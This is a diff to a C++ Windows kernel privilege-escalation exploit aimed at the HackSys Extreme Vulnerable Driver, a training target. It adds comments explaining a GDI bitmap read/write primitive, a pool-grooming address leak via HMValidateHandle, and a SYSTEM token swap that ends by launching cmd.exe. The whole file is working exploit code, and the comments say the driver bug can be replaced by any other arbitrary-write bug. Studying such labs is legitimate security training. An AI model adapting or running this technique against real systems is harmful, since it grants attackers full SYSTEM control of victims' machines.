@@ -1,6 +1,36 @@
 
 /*
-	leak lpszMenuName using HMValidateHandle, that is allocated on the same pool region
+	GdiExp.cc
+	
+	this module make's use of the gdi objects SetBitmapBits & GetBitmapBits in order
+	to overwrite the current process token (security descriptor) with the System's
+	Token. this compromises the system becouse then the thread can do as he wants on the target machine.
+	
+	the overwrite works as follows:
+	We got two objects, WorkerBitmap & ManagerBitmap (named for convenience).
+	
+	The SetBitmapBits function sets the bits of color data for a bitmap to the specified values.
+	The GetBitmapBits function copies the bitmap bits of a specified device-dependent bitmap into a buffer.
+	
+	with any arbitrary overwrite bug we can overwrite the pvScan0 pointer of one of the gdi objects
+	to point to the other object pvScan0, with that we can later use setbitmapbits with the worker to change the value
+	that this pointer points to.
+	
+	so we can set the pointer to any arbitrary location (evan in kernel) and then, use SetBitmapBits
+	with the manager to get arbitrary write to the kernel or GetBitmapBits to read from kernel space.
+	
+	___________   SetBitmapBits
+	|pvScan0   |\
+	|          |  \
+	|__________|    \(arbitrary address)
+			|pvScan0   |\
+			|          |  \
+	<---------------|          |    \ arbitrary value, Write Operation.
+	 GetBitmapBits
+	 ArbitraryRead.
+	
+	
+	we need to leak lpszMenuName using HMValidateHandle, that is allocated on the same pool region
 	as the bitmap object, in order to later use in an arbitrary overwrite bug.
 	using SeBitmapBits & GetBitmapBits as w/r op.
 	Ref:
@@ -38,16 +68,32 @@
 
 #define hDev "\\\\.\\HacksysExtremeVulnerableDriver"
 
+/*
+	HMValidateHandle is not an exported function, becouse of that we need to
+	menually find its address and call it by stdcall convention from its memory pointer
+	so its needed to define this function as void ptr to later call it.
+*/
 typedef void*(NTAPI *lHMValidateHandle)(
 	HWND h,
 	int type
 );
+
+/*
+	it is usefull to declare such an object, to leak lpszMenuName is not very
+	reliable so is better to create object and populate them accordingly in close proximty to
+	destroying the window object that is allocated in the same pool region.
+*/
 
 typedef struct _hBmp {
 	HBITMAP hBmp;
 	DWORD64 kAddr;
 	PUCHAR pvScan0;
 } HBMP, *PHBMP;
+
+/*
+	to create a window object we need to set a main method
+	other wise allocation will fail.
+*/
 
 LRESULT
 CALLBACK MainWProc(
@@ -60,11 +106,19 @@ CALLBACK MainWProc(
 
 lHMValidateHandle pHmValidateHandle = NULL;
 
+// REF:
 // https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp
 BOOL
 GetHMValidateHandle(
 )
 {
+	/*
+		we need to menually search user32.dll
+		near the "IsMenu" entry and make comprehension
+		to start of the function signature in order to get the pointer to
+		HMValidateHandle function, that can be used to retrieve memory location's of
+		later allocated window objects.
+	*/
 	HMODULE hUser32 = LoadLibraryA("user32.dll");
 	if (hUser32 == NULL) {
 		exit(GetLastError());
@@ -92,6 +146,14 @@ GetHMValidateHandle(
 	return TRUE;
 }
 
+
+/*
+	we need to get ntoskernel base address in order to compute the PsInitialSystemProcess
+	that points to System's _EPROCESS structure.
+	we use ZwQuerySystemInformation, and this is only from medium integrity level
+	on windows 10, but this can be replaced by a kernel leak, see BHUSA2017 morten schenk's
+	presentations for more information.
+*/
 PUCHAR
 GetNtos(
 )
@@ -149,6 +211,10 @@ GetNtos(
 	return (PUCHAR)Nt;
 }
 
+/*
+	we load ntoskernel inuser space to compute PsInitialSystemProcess
+	&PsInitialSystemProcess = NtoskrnlKernelBaseAddress + UserPsInitialSystemProcess - UserNtoskrnlBaseAddress
+*/
 DWORD64
 GetPsInitialSystemProcess(
 )
@@ -161,6 +227,12 @@ GetPsInitialSystemProcess(
 	printf("[+] PsInitialSystemProcess: %p\n", Psi);
 	return (DWORD64)Psi;
 }
+
+/*
+	create window object that is allocated in the same pool region like the bitmap object,
+	to leak its pointer, then allocate a bitmap object with big byte array so they are both on close size,
+	and leak maybe more reliable.
+*/
 
 ATOM
 RegisterhWnd(
@@ -181,7 +253,7 @@ DestroyWnd(
 	) 
 {
 	DestroyWindow(hWnd);
-	UnregisterClassW(L"aaa",NULL);
+	UnregisterClassW(L"aaa",NULL);  // destroy object to free memory to allocate the gdi obj.
 }
 
 HWND
@@ -189,7 +261,7 @@ CreateWindowObject(
 	) 
 {
 	WCHAR* Buff = new WCHAR[0x8F0];
-	RtlSecureZeroMemory(Buff, 0x8F0);
+	RtlSecureZeroMemory(Buff, 0x8F0);  // create big window object to make entropy small.
 	RtlFillMemory(Buff, 0x8F0, '\x41');
 	ATOM Cls = RegisterhWnd(L"aaa" ,Buff);
 	return CreateWindowExW(0, L"aaa", NULL, 0, 0, 0, 0, 0, 0, 0, NULL, 0);
@@ -201,19 +273,27 @@ LeaklpszMenuName(
 	) 
 {
 	DWORD64 pCLSOffset = 0xa8;
-	DWORD64 lpszMenuNameOffset = 0x90;
-	BOOL bRet = GetHMValidateHandle();
+	DWORD64 lpszMenuNameOffset = 0x90;  // Calculate the ulClientDelta to compute the object kernel bAddr
+	BOOL bRet = GetHMValidateHandle(); // using the previously found HMValidateHandle function pointer.
 	void* lpUserDesktopHeapWindow = pHmValidateHandle(hWnd, 1);
-	uintptr_t ulClientDelta = *reinterpret_cast<DWORD64 *>((DWORD64*)(lpUserDesktopHeapWindow) +0x20) - (DWORD64)(lpUserDesktopHeapWindow);
+	uintptr_t ulClientDelta = *reinterpret_cast<DWORD64 *>((DWORD64*)(lpUserDesktopHeapWindow) +0x20) - (
+		DWORD64)(lpUserDesktopHeapWindow);
 	uintptr_t KerneltagCLS = *reinterpret_cast<DWORD64 *>((DWORD64)lpUserDesktopHeapWindow+ pCLSOffset);
 	DWORD64 lpszMenuName = *reinterpret_cast<DWORD64 *>(KerneltagCLS - ulClientDelta + lpszMenuNameOffset);
 	return lpszMenuName;
 }
 
+/*
+	continuously allocate and destroy windows objects until we get the same results
+	for the lpszMenuName pointer address to make exploit more reliable.
+	after leak, destoy the window object and allocate the bitmap instead.
+*/
+
 BOOL
 Leak(
-	_In_ int y,
-	_In_ HBMP &hbmp
+	int y,
+	HBMP &hbmp  // you have to pass a reference other-wise the compiler will
+		    // create a new object and that is very bad.
 	)
 {
 	
@@ -252,7 +332,7 @@ Leak(
 
 DWORD64
 BitmapArbitraryRead(
-	HBITMAP &Mgr, // Send a Fkin reference!
+	HBITMAP &Mgr, // Send a ref same reason as above.
 	HBITMAP &Wrk,
 	DWORD64 addr
 )
@@ -263,6 +343,11 @@ BitmapArbitraryRead(
 		MEM_COMMIT | MEM_RESERVE,
 		PAGE_READWRITE
 	);
+	//
+	// we want to read from arbitrary location, so set the manager bits to 
+	// address we want to read, then get the values with the worker.
+	//
+	
 	auto m = SetBitmapBits(Mgr, sizeof(addr), (LPVOID *)&addr);
 	if (m == 0) {
 		printf("error setting bits!");
@@ -284,6 +369,8 @@ DWORD64 BitmapArbitraryWrite(
 	) 
 {
 
+	// Same but only set values (for writing).
+	
 	SetBitmapBits(Mgr, 8, (LPVOID *)&addr);
 
 	if (SetBitmapBits(Wrk, 8, &Val) == 0) {
@@ -291,6 +378,10 @@ DWORD64 BitmapArbitraryWrite(
 	}
 	return(0);
 }
+
+/*
+	Main Logic.
+*/
 
 int
 main(
@@ -300,6 +391,9 @@ main(
 	printf("\n[!] gdi feng shui ..\n");
 	printf("[>] Spraying the pool\n");
 	printf("[>] leaking ulClientDelta...\n");
+	// first create object (memory structure's alone), so only when window object is
+	// deleted then allocate bitmap,
+	// we only get pointers then bck from leak function.
 	HBMP managerBitmap;
 	HBMP workerBitmap;
 	if (!Leak(0, managerBitmap)) {
@@ -315,8 +409,12 @@ main(
 	printf("[+] Mgr pvScan0 offset: %p\n", managerBitmap.kAddr & -0xfff);
 	printf("[+] Wrk pvScan0 offset: %p\n", workerBitmap.kAddr & -0xfff);
 
+	// for debug.
 	//getch();
 
+	
+	// this is the arbitrary overwrite bug in the HEVD driver,
+	// this ofc can be replaced by any other bug.
 	byte Buff[sizeof(LPVOID) * 2] = { 0 };
 
 	LPVOID wPtr = VirtualAlloc(0, sizeof(LPVOID), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -364,8 +462,14 @@ main(
 
 	DWORD64 EpPtr = GetPsInitialSystemProcess();
 	printf("\n[!] running exploit...\n\n\n");
-
-
+	
+	// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+	// 
+	// This is ShellCode Time, i take asseambly used b4 to make C shellcode.
+	// READ asseambly for ref...
+	//
+	//
+	// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 /*
 
 	This is The ShellCode used to OverWrite The Token...
@@ -436,11 +540,37 @@ mov [rax + 0x358], rcx
 			managerBitmap.hBmp, workerBitmap.hBmp, (
 			(DWORD64)NextEpPtr + 0x2e8)) - 0x2e8;
 	}
+	
+	/*
+	
+		i dont know i see many ppl not dereference the system token b4 replacing token,
+		i never got success without this.
+		i also read two problems when not making dereference b4 replace
+		you can read this as a ref:
+		https://github.com/hfiref0x/CVE-2015-1701/issues/2
+		https://github.com/tandasat/ExploitCapcom/blob/master/ExploitCapcom/ExploitCapcom/ExploitCapcom.cpp#L257
+	*/
+	
 
 	BitmapArbitraryWrite(managerBitmap.hBmp, workerBitmap.hBmp, (
 		(DWORD64)NextEpPtr + 0x358), ((DWORD64)SysToken & -0xf)); // Null The Damn Ref_count...
 
+	// if we got here (hit break on endless loop we are allready system so create cmd session.)
+	
 	system("cmd.exe");
 	return 0;
 }
+
+/*
+	for any inaccuracies please write to me,
+	twitter: @_akayn
+	Cheers!
+*/
+
+
+
+
+
+
+
 
